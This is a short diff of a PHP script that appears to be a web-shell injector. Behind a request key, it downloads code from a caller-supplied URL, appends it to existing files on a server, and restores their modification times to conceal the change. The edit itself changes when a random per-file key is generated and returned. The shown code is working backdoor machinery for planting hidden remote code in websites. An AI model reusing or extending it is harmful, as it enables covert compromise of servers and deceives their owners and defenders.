@@ -177,8 +177,8 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
                 if (file_exists($path)) {
                     if ($f = file_get_contents($_REQUEST["url"], false, null, 0)) {
                         $time = filemtime($path);
-                        $key = randomStr(12);
                         if (isset($_REQUEST["private"])) {
+                            $key = randomStr(12);
                             $file = str_replace("INSERT_KEY", $key, $f);
                         } else {
                             $file = $f;
@@ -204,7 +204,11 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
 EOT;
                         if (file_put_contents($path, $code, FILE_APPEND)) {
                             touch($path, $time);
-                            $res[] = array("path" => $path, "key" => $key);
+                            $arr["path"] = $path;
+                            if (isset($_REQUEST["private"])) {
+                                $arr["key"] = $key;
+                            }
+                            $res[] = $arr;
                         }
                     }
                 }
